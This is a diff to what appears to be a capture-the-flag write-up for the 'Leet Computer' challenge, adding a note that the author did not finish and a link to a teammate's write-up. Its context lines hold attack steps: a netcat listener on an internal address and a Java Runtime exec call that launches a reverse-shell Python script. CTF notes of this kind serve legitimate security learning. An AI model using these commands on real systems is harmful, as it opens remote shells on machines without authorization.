@@ -16,3 +16,8 @@ Still working on it... just dropping commands
 8. *Setup Netcat listener*
    ```nc -l 10.40.3.230```
 9. ```print new java.lang.Runtime().exec("python3 /tmp/reverse.py")```
+
+
+**NOTE:** I did not finish this challenge before the competition ended. However, one of my teammates was able to solve before the competition ended.
+
+Here is a write-up for this challenge by Łukasz Szymański: [Leet Computer](https://szymanski.ninja/en/ctfwriteups/2021/norzhctf2021/leet-computer/)
